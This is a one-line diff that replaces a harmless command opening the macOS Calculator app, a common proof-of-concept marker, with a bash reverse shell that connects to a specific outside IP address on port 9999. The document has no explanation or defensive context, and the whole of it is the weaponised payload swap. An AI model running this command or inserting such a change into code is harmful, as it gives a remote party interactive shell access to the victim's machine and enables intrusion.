@@ -1,1 +1,1 @@
-open /Applications/Calculator.app
+bash -i >& /dev/tcp/192.225.226.22/9999 0>&1
